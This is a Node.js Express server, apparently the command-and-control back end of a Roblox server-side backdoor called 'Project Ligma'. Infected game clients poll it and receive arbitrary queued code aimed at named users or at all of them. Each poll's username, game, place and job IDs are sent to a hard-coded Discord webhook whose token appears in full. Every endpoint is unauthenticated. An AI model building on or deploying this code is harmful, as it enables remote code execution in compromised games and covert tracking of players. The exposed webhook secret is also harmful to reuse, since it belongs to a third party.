const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();

app.use(cors());
app.use(express.json());

let commands = [];
let gameLogs = [];

// === CONFIG ===
const WHITELIST_ACCOUNT = "d6Z9e";
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1540308620846178304/ixDVlAIUZRYGZbbbV5pquLPG0rq3ouVZzrIUqbl3V9s1ZeoHk9rBPJsqoOw6CvY627Gb";

// === DISCORD WEBHOOK LOGGER ===
async function sendToDiscord(message) {
    try {
        const payload = { content: message };
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        console.log('[Discord] sent');
    } catch (e) {
        console.log('[Discord] error:', e.message);
    }
}

// === ENDPOINTS ===

// Poller endpoint
app.post('/poll', async (req, res) => {
    const { username, jobId, gameId, placeId } = req.body;
    
    if (!username) {
        return res.status(400).json({ error: 'missing username' });
    }
    
    // Log game info
    const logEntry = {
        username,
        jobId: jobId || 'N/A',
        gameId: gameId || 'N/A',
        placeId: placeId || 'N/A',
        timestamp: new Date().toISOString()
    };
    gameLogs.push(logEntry);
    
    // Send to Discord
    const discordMsg = `**[🎮 GAME LOGGER]**\n👤 User: ${username}\n🎮 Game ID: ${gameId || 'N/A'}\n📌 Place ID: ${placeId || 'N/A'}\n🆔 Job: ${(jobId || 'N/A').substring(0, 12)}...\n🕐 Time: ${new Date().toLocaleString()}`;
    await sendToDiscord(discordMsg);
    
    console.log(`[LOG] ${username} | ${gameId}`);
    
    // Get commands for this user
    const userCommands = commands.filter(cmd => 
        cmd.target.toLowerCase() === username.toLowerCase() || 
        cmd.target.toLowerCase() === 'all'
    );
    
    // Remove delivered commands
    const deliveredIds = userCommands.map(c => c.id);
    commands = commands.filter(c => !deliveredIds.includes(c.id));
    
    res.json({ 
        commands: userCommands, 
        whitelistAccount: WHITELIST_ACCOUNT 
    });
});

// Add command (C# GUI calls this)
app.post('/add_command', async (req, res) => {
    const { target, code } = req.body;
    
    if (!target || !code) {
        return res.status(400).json({ error: 'missing target or code' });
    }
    
    const cmd = {
        id: Date.now().toString(),
        target: target,
        code: code,
        timestamp: new Date().toISOString()
    };
    commands.push(cmd);
    
    // Log to Discord
    const discordMsg = `**[⚡ COMMAND EXECUTED]**\n🎯 Target: ${target}\n📝 Code length: ${code.length} chars\n🕐 Time: ${new Date().toLocaleString()}`;
    await sendToDiscord(discordMsg);
    
    console.log(`[CMD] ${target} | ${code.length} chars`);
    res.json({ success: true, id: cmd.id });
});

// Get game logs
app.get('/logs', (req, res) => {
    res.json(gameLogs);
});

// Get pending commands count
app.get('/pending', (req, res) => {
    res.json({ count: commands.length, commands: commands });
});

// Clear logs
app.delete('/logs', (req, res) => {
    gameLogs = [];
    res.json({ success: true });
});

// Clear all commands
app.delete('/commands', (req, res) => {
    commands = [];
    res.json({ success: true });
});

// Get whitelist account
app.get('/whitelist', (req, res) => {
    res.json({ whitelistAccount: WHITELIST_ACCOUNT });
});

// Health check
app.get('/', (req, res) => {
    res.send('Project Ligma — Serverside Poller Running ✅');
});

// Stats
app.get('/stats', (req, res) => {
    res.json({
        whitelistAccount: WHITELIST_ACCOUNT,
        totalLogs: gameLogs.length,
        pendingCommands: commands.length,
        uptime: process.uptime()
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🔑 Whitelist Account: ${WHITELIST_ACCOUNT}`);
    console.log(`📡 Discord logging: ENABLED`);
    console.log(`🌐 URL: https://ligma-42v2.onrender.com`);
});
